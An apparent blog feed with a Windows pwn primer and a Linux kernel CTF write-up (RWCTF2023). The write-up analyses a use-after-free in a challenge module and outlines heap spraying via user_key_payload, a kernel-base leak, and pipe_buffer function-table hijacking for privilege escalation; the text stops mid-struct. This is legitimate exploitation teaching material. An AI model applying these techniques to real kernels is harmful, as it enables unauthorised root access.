<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ixout&#39;s blog</title>
  
  
  <link href="https://ixout.github.io/atom.xml" rel="self"/>
  
  <link href="https://ixout.github.io/"/>
  <updated>2024-02-03T15:39:03.296Z</updated>
  <id>https://ixout.github.io/</id>
  
  <author>
    <name>ixout</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>windows pwn</title>
    <link href="https://ixout.github.io/posts/53436/"/>
    <id>https://ixout.github.io/posts/53436/</id>
    <published>2024-02-03T15:02:37.000Z</published>
    <updated>2024-02-03T15:39:03.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><a href="https://github.com/Wenzel/checksec.py">Wenzel/checksec.py: Checksec tool in Python, Rich output. Based on LIEF (github.com)</a></p><h2 id="winpwn"><a href="#winpwn" class="headerlink" title="winpwn"></a>winpwn</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pip3 install winpwn</span><br><span class="line"></span><br><span class="line">pip3 install pefile</span><br><span class="line"></span><br><span class="line">pip3 install keystone-engine</span><br><span class="line"></span><br><span class="line">pip3 install install capstone</span><br></pre></td></tr></table></figure><h2 id="windbg"><a href="#windbg" class="headerlink" title="windbg"></a>windbg</h2><p>microsoft store下载</p><p>配置到winpwn调试</p><p>在HOMEDIR创建.winpwn</p><p>填入一下内容,自行更改路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;debugger&quot;:&#123;</span><br><span class="line">        &quot;i386&quot;: &#123;</span><br><span class="line">            &quot;x64dbg&quot;: &quot;F:\\ctfTools\\debugTools\\x64debug\\release\\x32\\x32dbg.exe&quot;, </span><br><span class="line">            &quot;gdb&quot;: &quot;F:\\ctfTools\\windows-gdb\\mingw-w64-686\\mingw32\\bin\\gdb.exe&quot;, </span><br><span class="line">            &quot;windbg&quot;: &quot;C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe&quot;,</span><br><span class="line">            &quot;windbgx&quot;: &quot;C:\\Users\\byzero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;amd64&quot;: &#123;</span><br><span class="line">            &quot;x64dbg&quot;: &quot;F:\\ctfTools\\debugTools\\x64debug\\release\\x64\\x64dbg.exe&quot;, </span><br><span class="line">            &quot;gdb&quot;: &quot;F:\\ctfTools\\windows-gdb\\mingw-w64-64\\mingw64\\bin\\gdb64.exe&quot;, </span><br><span class="line">            &quot;windbg&quot;: &quot;C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe&quot;,</span><br><span class="line">            &quot;windbgx&quot;: &quot;C:\\Users\\byzero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;debugger_init&quot;: &#123;</span><br><span class="line">        &quot;i386&quot;: &#123;</span><br><span class="line">            &quot;x64dbg&quot;: &quot;&quot;, </span><br><span class="line">            &quot;gdb&quot;: &quot;&quot;, </span><br><span class="line">            &quot;windbg&quot;: &quot;.load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x86\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;&quot;,</span><br><span class="line">            &quot;windbgx&quot;: &quot;.load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x86\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;amd64&quot;: &#123;</span><br><span class="line">            &quot;x64dbg&quot;: &quot;&quot;, </span><br><span class="line">            &quot;gdb&quot;: &quot;&quot;, </span><br><span class="line">            &quot;windbg&quot;: &quot;.load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;&quot;,</span><br><span class="line">            &quot;windbgx&quot;: &quot;.load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="winserver"><a href="#winserver" class="headerlink" title="winserver"></a>winserver</h2><p><a href="https://github.com/Ex-Origin/win_server">https://github.com/Ex-Origin/win_server</a></p><h2 id="ProcessExplorer"><a href="#ProcessExplorer" class="headerlink" title="ProcessExplorer"></a>ProcessExplorer</h2><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">进程资源管理器 - Sysinternals | Microsoft Learn</a></p><h2 id="vmmap"><a href="#vmmap" class="headerlink" title="vmmap"></a>vmmap</h2><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/vmmap">VMMap - Sysinternals | Microsoft Learn</a></p><h1 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h1><h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><p>即linux下的NX,栈不可执行</p><h2 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h2><p>即linux下的canary,不太相同的是GS的值最低位不是<code>\x00</code></p><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>地址随机化,使得共享库,堆栈的地址不固定。</p><h2 id="Dynamic-Base"><a href="#Dynamic-Base" class="headerlink" title="Dynamic Base"></a>Dynamic Base</h2><p>程序编译时可通过<code>/DYNAMICBASE</code>编译选项指示程序是否利用<code>ASLR</code>的功能。</p><h2 id="High-Entropy-VA"><a href="#High-Entropy-VA" class="headerlink" title="High Entropy VA"></a>High Entropy VA</h2><p>这个保护被称为高熵64位地址空间布局随机化，一旦开启，表示此程序的地址随机化的取值空间为<code>64 bit</code>，这会导致攻击者更难去推测随机化后的地址</p><h2 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h2><p>结构化异常处理（Structured Exception Handling，简称 SEH）是一种<code>Windows</code>操作系统对错误或异常提供的处理技术。为<code>Windows</code>的程序设计者提供了程序错误或异常的处理途径，使得系统更加健壮。</p><h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><p>为了防止攻击者通过覆盖堆栈上的异常处理函数句柄，从而控制程序执行流程的攻击，在调用异常处理函数之前，对要调用的异常处理函数进行一系列的有效性校验，如果发现异常处理函数不可靠，立即终止异常处理函数的调用。</p><h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><p>即结构化异常处理保护(<code>Structured Exception Handling Overwrite Protection</code>)，这个保护能够防止攻击者利用结构化异常处理来进行进一步的利用。</p><h2 id="Force-Integrity"><a href="#Force-Integrity" class="headerlink" title="Force Integrity"></a>Force Integrity</h2><p>这个保护被称为强制签名保护，一旦开启，表示此程序加载时需要验证其中的签名，如果签名不正确，程序将会被阻止运行。</p><h2 id="Control-Flow-Guard"><a href="#Control-Flow-Guard" class="headerlink" title="Control Flow Guard"></a>Control Flow Guard</h2><p>控制<code>Flow</code>防护 (CFG) 是一项高度优化的平台安全功能，旨在打击内存损坏漏洞。 通过严格限制应用程序可以从何处执行代码，利用漏洞（如缓冲区溢出）执行任意代码会更加困难。</p><p>这项技术通过在间接跳转前插入校验代码，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点， 最终及时并有效的进行异常处理，避免引发相关的安全问题</p><h2 id="Return-Flow-Guard"><a href="#Return-Flow-Guard" class="headerlink" title="Return Flow Guard"></a>Return Flow Guard</h2><p>即返回地址防护(<code>Return Flow Guard</code>)，这项技术会在每个函数头部将返回地址保存到<code>fs:[rsp]</code>(<code>Thread Control Stack</code>)，并在函数返回前将其与栈上返回地址进行比较，从而有效阻止了这些攻击方式。</p><h2 id="Isolation"><a href="#Isolation" class="headerlink" title="Isolation"></a>Isolation</h2><p>这个保护被称为隔离保护，一旦开启，表示此程序加载时将会在一个相对独立的隔离环境中被加载，从而阻止攻击者过度提升权限。</p><h2 id="Authenticode"><a href="#Authenticode" class="headerlink" title="Authenticode"></a>Authenticode</h2><p>签名保护</p>]]></content>
    
    
    <summary type="html">windows-pwn初识</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="windows" scheme="https://ixout.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>kernel学习笔记2</title>
    <link href="https://ixout.github.io/posts/63384/"/>
    <id>https://ixout.github.io/posts/63384/</id>
    <published>2024-01-08T09:35:11.000Z</published>
    <updated>2024-02-05T14:41:31.463Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RWCTF2023-体验赛-Digging-into-kernel-3"><a href="#RWCTF2023-体验赛-Digging-into-kernel-3" class="headerlink" title="RWCTF2023 体验赛 - Digging into kernel 3"></a>RWCTF2023 体验赛 - Digging into kernel 3</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先看启动脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ </span><br><span class="line">   3   │ qemu-system-x86_64 \</span><br><span class="line">   4   │     -m 128M \</span><br><span class="line">   5   │     -nographic \</span><br><span class="line">   6   │     -kernel ./bzImage \</span><br><span class="line">   7   │     -initrd ./rootfs.img \</span><br><span class="line">   8   │     -cpu kvm64,+smap,+smep \</span><br><span class="line">   9   │     -monitor /dev/null \</span><br><span class="line">  10   │     -append <span class="string">&#x27;console=ttyS0 kaslr kpti=1 quiet oops=panic panic=1 init=/init&#x27;</span> \</span><br><span class="line">  11   │     -no-reboot \</span><br><span class="line">  12   │     -snapshot \</span><br><span class="line">  13   │     -s</span><br><span class="line">  14   │     </span><br><span class="line">  15   │     <span class="comment">#-enable-kvm \</span></span><br><span class="line">───────┴────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>可以看到开启了smap,smep,kaslr,kpri等保护</p><p>再看init脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ </span><br><span class="line">   3   │ <span class="built_in">mkdir</span> /tmp </span><br><span class="line">   4   │ mount -t proc none /proc </span><br><span class="line">   5   │ mount -t sysfs none /sys </span><br><span class="line">   6   │ mount -t devtmpfs none /dev </span><br><span class="line">   7   │ mount -t tmpfs none /tmp </span><br><span class="line">   8   │ </span><br><span class="line">   9   │ <span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line">  10   │ <span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line">  11   │ <span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line">  12   │ </span><br><span class="line">  13   │ insmod /rwctf.ko</span><br><span class="line">  14   │ <span class="built_in">chmod</span> 666 /dev/rwctf</span><br><span class="line">  15   │ <span class="built_in">chmod</span> 700 /flag</span><br><span class="line">  16   │ <span class="built_in">chmod</span> 400 /proc/kallsyms</span><br><span class="line">  17   │ </span><br><span class="line">  18   │ <span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  19   │ <span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  20   │ </span><br><span class="line">  21   │ poweroff -d 120 -f &amp;</span><br><span class="line">  22   │ </span><br><span class="line">  23   │ <span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span> </span><br><span class="line">  24   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">  25   │ </span><br><span class="line">  26   │ umount /proc</span><br><span class="line">  27   │ umount /sys</span><br><span class="line">  28   │ umount /tmp</span><br><span class="line">  29   │ </span><br><span class="line">  30   │ poweroff -d 0 -f</span><br></pre></td></tr></table></figure><p>kptr_restrict参数控制是否对非特权用户隐藏内核符号地址的显示。</p><p>dmesg_restrict参数控制非特权用户对内核日志dmesg的访问权限。</p><p>为1就是非特权用户无权访问</p><p>那么主要就是利用rwctf.ko这个模块了</p><p>ida打开分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">rwmod_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// r12d</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">-1</span>;</span><br><span class="line">  cdev = <span class="number">255</span>;</span><br><span class="line">  qword_7A8 = (__int64)<span class="string">&quot;rwctf&quot;</span>;</span><br><span class="line">  qword_7B0 = (__int64)&amp;file_ops;</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)misc_register(&amp;cdev) )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="number">0</span>;</span><br><span class="line">    printk(&amp;unk_1B9);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>misc_register()</code> 函数用于注册杂项字符设备</p><p>注册的函数真正有用的函数便只有ioctl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">rwmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xC0DECAFE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;v7, a3, <span class="number">16LL</span>) &amp;&amp; v7 &lt;= <span class="number">1</span> )</span><br><span class="line">      kfree(buf[v7]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;v7, a3, <span class="number">16LL</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    v5 = v7;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    buf[v5] = _kmalloc(v8, <span class="number">3520LL</span>);</span><br><span class="line">    v6 = buf[v7];</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; <span class="number">2147483647uLL</span> )</span><br><span class="line">      BUG();</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v6, v9, v8) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到有明显的uaf漏洞,此外申请内存时最多只能同时控制两个obj</p><p>且必须申请后才能使用,这点倒是内核模块中似乎都如此</p><h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><p>这个解法是ctf-wiki为了讲解heap-spray特意选用的一种方法,为了讲解这一技巧可能选用了不那么直接的方法</p><p>核心思路是通过uaf改大user_key_payload的datalen字段,以此做到溢出并泄露内核基址,并再次通过uaf写pipe管道的函数表字段从而完成最终利用</p><p>为了方便利用需要将decription长度和payload的长度区分开,以此简化利用模型,只需要考虑payload的两个obj</p><p><strong>add_key() 会先分配一个临时的 obj1 拷贝 payload 后再分配一个 obj2 作为 user_key_payload</strong>，若我们先分配一个 obj 并释放后再调用 add_key() 则该 obj 不会直接成为 <code>user_key_payload</code> ，而是会在后续的数次分配中都作为拷贝 payload 的临时 obj 存在。</p><blockquote><p>另一个显然的办法是程序提供了两个obj的管理,那就使用这两个指针来uaf,但这里wiki为了展示堆喷这一技巧选择就用一个指针来完成</p><p>此外个人的一个想法是能不能使得obj1与obj2位于两个kmem_cache分配器中,其中关键的user_key_payload位于192,临时obj1则位于128,有时间可以试试</p></blockquote><p><strong>但我们可以通过堆喷将 UAF obj 分配到 user_key_payload</strong>，考虑如下流程：</p><ul><li>利用题目功能构建 UAF object。</li><li>堆喷射 <code>user_key_payload</code> ，UAF obj 作为拷贝 payload 的临时 obj 存在。</li><li><code>kmem_cache_cpu</code> 的 slub page 耗光，向 node 请求新的 slub page 分配 <code>user_key_payload</code> ，完成后 UAF obj 被释放并回到 <code>kmem_cache_node</code>。</li><li>继续堆喷 <code>user_key_payload</code> ，<code>kmem_cache_cpu</code> 的 slub page 耗光，向 node 请求新的 slub page 分配 <code>user_key_payload</code> 。</li><li>UAF obj 所在页面被取回，UAF obj 被分配为 <code>user_key_payload</code> 。</li><li>利用题目功能再次释放 UAF obj，利用题目功能进行堆喷获取到该 obj，从而覆写 <code>user_key_payload</code> 。</li></ul><p>可能有点难理解,简单来说就是每次add_key会使用两个obj,第一个是临时obj最终会释放,而我们的目标是uaf第二个user_key_payload,</p><p>每次add_key实际上slab减少一个obj,因此在耗尽第一个slab之前显然每次我们uaf控制的都是临时obj,但在第一个slab仅剩一个obj时,这个obj被用来做第一个临时obj,而去一个新的slab获取第二个obj用作user_key_payload,那么在这次add_key结束后,第一个obj又被释放,那么在第二个slab仅剩一个obj时,再来一次add_key就会使我们能够uaf的obj作为user_key_payload</p><p>接下来我们考虑越界读取什么数据，这里我们并不需要分配其他的结构体， <code>rcu_head-&gt;func</code> <strong>函数指针在 rcu 对象被释放后才会被写入并调用，但调用完并不会将其置为 NULL</strong>，因此我们可以通过释放密钥的方式在内核堆上留下内核函数指针，从而完成内核基址的泄露。即通过key_read泄露slab页中残余的函数指针</p><p>可以用来控制内核执行流的结构体有很多，但是我们需要考虑如何完整地执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 后再成功返回用户态，因此我们需要进行栈迁移以布置较为完整的 ROP gadget chain。</p><p>由于题目开启了 SMEP、SMAP 保护，因此我们只能在内核空间伪造函数表，同时<u>内核中的大部分结构体的函数表为静态指定</u>（例如 <code>tty-&gt;ops</code> 总是 <code>ptm（或pty）_unix98_ops</code>），因此我们还需要知道一个内容可控的内核对象的地址，从而在内核空间中伪造函数表。</p><p>wiki选择管道相关的结构体完成利用；在内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> 来表示的，对应的就是一个 <code>pipe_inode_info</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">    <span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;<span class="comment">//该结构体使用kmalloc-192分配</span></span><br></pre></td></tr></table></figure><p>可以看到其中有一个bufs指针指向一个<code>struct pipe_buffer</code>，每个 <code>pipe_buffer</code> 结构体对应一张用以存储数据的内存页,虽然这个结构体不大,但是slab分配时会分配1024大小的obj</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>pipe_buf_operations</code> 为一张函数表，当我们对管道进行特定操作时内核便会调用该表上对应的函数，例如当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，由此我们便能控制内核执行流，从而完成提权。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment"> * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment"> * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment"> * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment"> * error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment"> * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment"> * -&gt;steal() returns 0 for success, in which case the contents</span></span><br><span class="line"><span class="comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned</span></span><br><span class="line"><span class="comment"> * by the caller. The page may then be transferred to a different</span></span><br><span class="line"><span class="comment"> * mapping, the most often used case is insertion into different</span></span><br><span class="line"><span class="comment"> * file address space cache.</span></span><br><span class="line"><span class="comment"> 